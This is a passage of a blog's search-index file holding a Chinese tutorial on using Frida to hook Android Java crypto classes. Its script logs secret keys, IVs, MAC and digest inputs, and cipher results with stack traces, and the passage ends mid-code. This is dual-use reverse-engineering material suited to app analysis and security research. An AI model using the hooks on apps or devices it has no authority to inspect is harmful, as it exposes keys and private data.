<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>frida Hook Java基础类中的所有加密类</title>
      <link href="/posts/13156/"/>
      <url>/posts/13156/</url>
      
        <content type="html"><![CDATA[<p>我们可以通过Hook Java基础类或第三方类库中的所有加密类来盲猜app用了哪种加密类。app用的加密类只要在我们Hook的类中，就可以判断出app用了哪种加密类，通过调用堆栈定位到加密代码。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printstack</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(Java.use(<span class="string">&quot;android.util.Log&quot;</span>).getStackTraceString(Java.use(<span class="string">&quot;java.lang.Exception&quot;</span>).$new()))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;enter&#x27;</span>)</span><br><span class="line">    <span class="keyword">var</span> Base64 = Java.use(<span class="string">&#x27;android.util.Base64&#x27;</span>)</span><br><span class="line">    <span class="keyword">var</span> ByteString = Java.use(<span class="string">&quot;com.android.okhttp.okio.ByteString&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> secretKeySpec = Java.use(<span class="string">&#x27;javax.crypto.spec.SecretKeySpec&#x27;</span>);</span><br><span class="line">    secretKeySpec.$init.overload(<span class="string">&#x27;[B&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.$init(a, b);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;算法名：&quot;</span> + b + <span class="string">&quot;|str密钥:&quot;</span> + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(a));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;算法名：&quot;</span> + b + <span class="string">&quot;|Hex密钥:&quot;</span> + ByteString.of(a).hex());</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> DESKeySpec = Java.use(<span class="string">&#x27;javax.crypto.spec.DESKeySpec&#x27;</span>);</span><br><span class="line">    DESKeySpec.$init.overload(<span class="string">&#x27;[B&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.$init(a);</span><br><span class="line">        <span class="keyword">var</span> bytes_key_des = <span class="built_in">this</span>.getKey();</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;des密钥  |str &quot;</span> + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(bytes_key_des));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;des密钥  |hex &quot;</span> + ByteString.of(bytes_key_des).hex());</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DESKeySpec.$init.overload(<span class="string">&#x27;[B&#x27;</span>, <span class="string">&#x27;int&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.$init(a, b);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">var</span> bytes_key_des = <span class="built_in">this</span>.getKey();</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;des密钥  |str &quot;</span> + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(bytes_key_des));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;des密钥  |hex &quot;</span> + ByteString.of(bytes_key_des).hex());</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> mac = Java.use(<span class="string">&#x27;javax.crypto.Mac&#x27;</span>);</span><br><span class="line">    mac.getInstance.overload(<span class="string">&#x27;java.lang.String&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.getInstance(a);</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;算法名：&quot;</span> + a);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    mac.update.overload(<span class="string">&#x27;[B&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="built_in">this</span>.update(a);</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;update:&quot;</span> + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(a))</span><br><span class="line">    &#125;</span><br><span class="line">    mac.update.overload(<span class="string">&#x27;[B&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b, c</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="built_in">this</span>.update(a, b, c)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;update:&quot;</span> + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(a) + <span class="string">&quot;|&quot;</span> + b + <span class="string">&quot;|&quot;</span> + c);</span><br><span class="line">    &#125;</span><br><span class="line">    mac.doFinal.overload().implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.doFinal();</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;mac doFinal结果: |str  :&quot;</span>     + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(result));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;mac doFinal结果: |hex  :&quot;</span>     + ByteString.of(result).hex());</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;mac doFinal结果: |base64  :&quot;</span>  + Base64.encodeToString(result,<span class="number">0</span>));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    mac.doFinal.overload(<span class="string">&#x27;[B&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.doFinal(a);</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;doFinal参数: |str  :&quot;</span>     + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(a));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;doFinal结果: |str  :&quot;</span>     + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(result));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;doFinal结果: |hex  :&quot;</span>     + ByteString.of(result).hex());</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;doFinal结果: |base64  :&quot;</span>  + Base64.encodeToString(result,<span class="number">0</span>));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> md = Java.use(<span class="string">&#x27;java.security.MessageDigest&#x27;</span>);</span><br><span class="line">    md.getInstance.overload(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;算法名：&quot;</span> + a);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getInstance(a, b);</span><br><span class="line">    &#125;</span><br><span class="line">    md.getInstance.overload(<span class="string">&#x27;java.lang.String&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;算法名：&quot;</span> + a);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getInstance(a);</span><br><span class="line">    &#125;</span><br><span class="line">    md.update.overload(<span class="string">&#x27;[B&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;update:&quot;</span> + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(a))</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.update(a);</span><br><span class="line">    &#125;</span><br><span class="line">    md.update.overload(<span class="string">&#x27;[B&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b, c</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;update:&quot;</span> + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(a) + <span class="string">&quot;|&quot;</span> + b + <span class="string">&quot;|&quot;</span> + c);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.update(a, b, c);</span><br><span class="line">    &#125;</span><br><span class="line">    md.digest.overload().implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.digest();</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;digest11结果:&quot;</span> + ByteString.of(result).hex());</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;digest结果:&quot;</span> + Base64.encodeToString(result,<span class="number">0</span>));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    md.digest.overload(<span class="string">&#x27;[B&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;digest参数:&quot;</span> + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(a));</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.digest(a);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;digest结果:&quot;</span> + ByteString.of(result).hex());</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;digest结果:&quot;</span> + Base64.encodeToString(result,<span class="number">0</span>));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> ivParameterSpec = Java.use(<span class="string">&#x27;javax.crypto.spec.IvParameterSpec&#x27;</span>);</span><br><span class="line">    ivParameterSpec.$init.overload(<span class="string">&#x27;[B&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.$init(a);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;iv向量: |str:&quot;</span> + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(a));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;iv向量: |hex:&quot;</span> + ByteString.of(a).hex());</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> cipher = Java.use(<span class="string">&#x27;javax.crypto.Cipher&#x27;</span>);</span><br><span class="line">    cipher.getInstance.overload(<span class="string">&#x27;java.lang.String&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.getInstance(a);</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;模式填充:&quot;</span> + a);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    cipher.init.overload(<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;java.security.Key&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.init(a, b);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (N_ENCRYPT_MODE == a)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;init  | 加密模式&quot;</span>);    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(N_DECRYPT_MODE == a)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;init  | 解密模式&quot;</span>);    </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> bytes_key = b.getEncoded();</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;init key:&quot;</span> + <span class="string">&quot;|str密钥:&quot;</span> + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(bytes_key));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;init key: |base64  :&quot;</span>  + Base64.encodeToString(bytes_key,<span class="number">0</span>));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;init key:&quot;</span> + <span class="string">&quot;|Hex密钥:&quot;</span> + ByteString.of(bytes_key).hex());</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    cipher.init.overload(<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;java.security.cert.Certificate&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.init(a, b);</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (N_ENCRYPT_MODE == a)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;init  | 加密模式&quot;</span>);    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(N_DECRYPT_MODE == a)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;init  | 解密模式&quot;</span>);    </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    cipher.init.overload(<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;java.security.Key&#x27;</span>, <span class="string">&#x27;java.security.spec.AlgorithmParameterSpec&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b, c</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.init(a, b, c);</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (N_ENCRYPT_MODE == a)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;init  | 加密模式&quot;</span>);    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(N_DECRYPT_MODE == a)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;init  | 解密模式&quot;</span>);    </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> bytes_key = b.getEncoded();</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;init key:&quot;</span> + <span class="string">&quot;|str密钥:&quot;</span> + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(bytes_key));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;init key: |base64  :&quot;</span>  + Base64.encodeToString(bytes_key,<span class="number">0</span>));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;init key:&quot;</span> + <span class="string">&quot;|Hex密钥:&quot;</span> + ByteString.of(bytes_key).hex());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    cipher.init.overload(<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;java.security.cert.Certificate&#x27;</span>, <span class="string">&#x27;java.security.SecureRandom&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b, c</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.init(a, b, c);</span><br><span class="line">        <span class="keyword">if</span> (N_ENCRYPT_MODE == a)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;init  | 加密模式&quot;</span>);    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(N_DECRYPT_MODE == a)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;init  | 解密模式&quot;</span>);    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    cipher.init.overload(<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;java.security.Key&#x27;</span>, <span class="string">&#x27;java.security.SecureRandom&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b, c</span>) </span>&#123;</span><br><span class="line">         <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.init(a, b, c);</span><br><span class="line">        <span class="keyword">if</span> (N_ENCRYPT_MODE == a)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;init  | 加密模式&quot;</span>);    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(N_DECRYPT_MODE == a)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;init  | 解密模式&quot;</span>);    </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> bytes_key = b.getEncoded();</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;init key:&quot;</span> + <span class="string">&quot;|str密钥:&quot;</span> + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(bytes_key));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;init key: |base64  :&quot;</span>  + Base64.encodeToString(bytes_key,<span class="number">0</span>));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;init key:&quot;</span> + <span class="string">&quot;|Hex密钥:&quot;</span> + ByteString.of(bytes_key).hex());</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    cipher.init.overload(<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;java.security.Key&#x27;</span>, <span class="string">&#x27;java.security.AlgorithmParameters&#x27;</span>).implementation = <span 